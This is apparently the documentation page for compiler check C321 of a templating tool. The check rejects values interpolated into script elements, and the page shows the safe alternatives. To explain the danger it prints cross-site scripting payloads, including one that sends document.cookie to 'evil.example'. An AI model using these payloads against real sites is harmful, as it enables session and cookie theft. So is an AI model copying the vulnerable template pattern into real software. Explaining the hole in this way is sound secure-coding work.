# C321 — value interpolated into a script

## Message

```
error[GOPAGE-C321]: a value is interpolated into a <script> body
help: the escaper writes html entities, which javascript does not read as text; pass the value to
      an island instead, or put it in a data- attribute and read it from there
```

## Why this is rejected

gopage escapes on the way out, and it escapes for HTML: `&`, `<`, `>`, `"` and `'` become entities.
That is the right answer inside markup and the wrong answer inside a `<script>` element, because the
body of a script is not markup — it is a JavaScript program, and the JavaScript grammar cares about
characters the escaper does not touch.

Consider a template that looks safe:

```gopage
<script>
  const query = `{{ Props.Query }}`;
</script>
```

A visitor asks for `/search?q=${alert(document.cookie)}`. Not one character of that payload is in the
escaper's table, so it reaches the page byte for byte:

```html
<script>
  const query = `${alert(document.cookie)}`;
</script>
```

The backtick makes it a template literal, `${...}` is a substitution, and the substitution runs. The
same hole opens without backticks whenever the value lands in a value position:

```gopage
<script>const page = {{ Props.Page }};</script>
```

`?page=0;fetch('https://evil.example/'+document.cookie)` becomes two statements instead of one.

Escaping `<` does stop `</script>` from closing the element early, so the injection stays inside the
script — which is no comfort, because inside the script is where the program runs.

## How to fix it

If the browser needs a value from the server, hand it over as data rather than as source. An island
receives its props as JSON, which **is** escaped for this context:

```gopage
<Search client="load" :Query="Props.Query" />
```

If you only need a value that some existing script reads, put it in an attribute and read it back:

```gopage
<div id="search" data-query="{{ Props.Query }}"></div>
```

```js
const query = document.getElementById("search").dataset.query;
```

The attribute is a normal HTML context, so the escaper is correct there.

## What this check does not cover

A `<script client>` block is not markup and never reaches this check — the lexer lifts it out before
parsing, and its body is bundled, not rendered. A `<script>` with no interpolation is ordinary markup
and compiles unchanged.
